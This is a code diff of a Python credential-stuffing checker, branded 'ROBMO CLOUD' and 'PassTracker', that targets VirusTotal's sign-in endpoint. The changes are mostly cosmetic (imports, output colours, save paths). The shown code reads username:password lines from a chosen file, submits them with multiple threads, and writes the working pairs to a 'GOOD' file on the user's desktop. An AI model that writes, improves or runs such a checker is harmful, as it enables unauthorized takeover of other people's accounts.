@@ -2,15 +2,14 @@ import tkinter as tk
 from tkinter import filedialog
 import requests
 import os
-from pathlib import Path
-import time, shutil
+import time
 import sys
 import concurrent.futures
 import signal
 import json
 from colorama import Fore, init
-import requests,os,time,re,sys,concurrent.futures,signal,subprocess,json
-from colorama import Fore , init
+import shutil
+from pathlib import Path
 from pystyle import *
 
 init()
@@ -19,14 +18,14 @@ os.system("cls")
 ROBMO = "═══════ • 𝐑𝐎𝐁𝐌𝐎 𝐂𝐋𝐎𝐔𝐃 • ════════"
 
 user = os.getlogin()
-save_path = f"C:\\Users\\{user}\\Desktop\\URL's Tools\\Checker\\𝐆𝐎𝐎𝐃[𝐕.𝐓][𝐑𝐎𝐁𝐌𝐎 𝐂𝐋𝐎𝐔𝐃].txt"
+save_path = f"C:\\Users\\{user}\\Desktop\\𝐏𝐚𝐬𝐬𝐓𝐫𝐚𝐜𝐤𝐞𝐫 ™\\𝐆𝐎𝐎𝐃\\𝐆𝐎𝐎𝐃[𝐕.𝐓][𝐑𝐎𝐁𝐌𝐎 𝐂𝐋𝐎𝐔𝐃].txt"
 
 passtracker = Path(f'C:/Users/{user}/Desktop/𝐏𝐚𝐬𝐬𝐓𝐫𝐚𝐜𝐤𝐞𝐫 ™')
 
 if not passtracker.exists():
     passtracker.mkdir()
 
-URLs_tools = passtracker / "URL's Tools"
+URLs_tools = passtracker / "𝐆𝐎𝐎𝐃"
 if not URLs_tools.exists():
     URLs_tools.mkdir()
 
@@ -70,6 +69,7 @@ def Banner():
     center(banner_text, Fore.RED)
     Write.Print(f"\n\n     Select File:   ", Colors.red)
 
+
 Banner()
 
 def select_file():
@@ -101,6 +101,7 @@ def select_file():
         time.sleep(2)
         os.system('cls' if os.name == 'nt' else 'clear')
         return file_path
+
 
 def check_credentials(line):
     global good_count
@@ -134,14 +135,14 @@ def check_credentials(line):
     response_data = response.json()
 
     if response.status_code == 200 and "Failure" not in response_data and "Incorrect user or password" not in response_data:
-        Write.Print(f"\n\n     [+] Success: {username}:{password}", Colors.green)
+        print(Fore.GREEN + f"\n\n     [+] Success: {username}:{password}")
         good_count += 1
         os.system(f"title VIRUS TOTAL CHECKER - Good: {good_count}")
         with open(save_path, "a", encoding="utf-8") as good_file:
             good_file.write(f"{username}:{password}\n")
             good_file.write(f"\n{ROBMO}\n\n")
     else:
-        Write.Print(f"\n\n     [!] Failure: {username}:{password}", Colors.red)
+        print(Fore.RED + f"\n\n     [!] Failure: {username}:{password}")
 
 
 def handle_interrupt(signal, frame):
@@ -164,7 +165,7 @@ try:
         good_count = 0
         bad_count = 0
         url = "https://www.virustotal.com/ui/signin"
-        print("\n\n     Enter threads", Fore.RED)
+        Write.Print("\n\n     Enter threads", Colors.red_to_white)
         num_threads = int(input(Fore.BLUE + "\n\n     [-]: "))
         os.system("cls")
 
@@ -177,9 +178,8 @@ try:
 
 except FileNotFoundError:
     os.system('cls' if os.name == 'nt' else 'clear')
-    print("\n\n     [•]  File not found. Please select a valid file.", Fore.RED)
+    Write.Print("\n\n     [•]  File not found. Please select a valid file.", Colors.red_to_yellow)
     time.sleep(3)
     sys.exit(2)
 
 os.system('cls' if os.name == 'nt' else 'clear')
-os.system('cd Checker && python Checker.py')
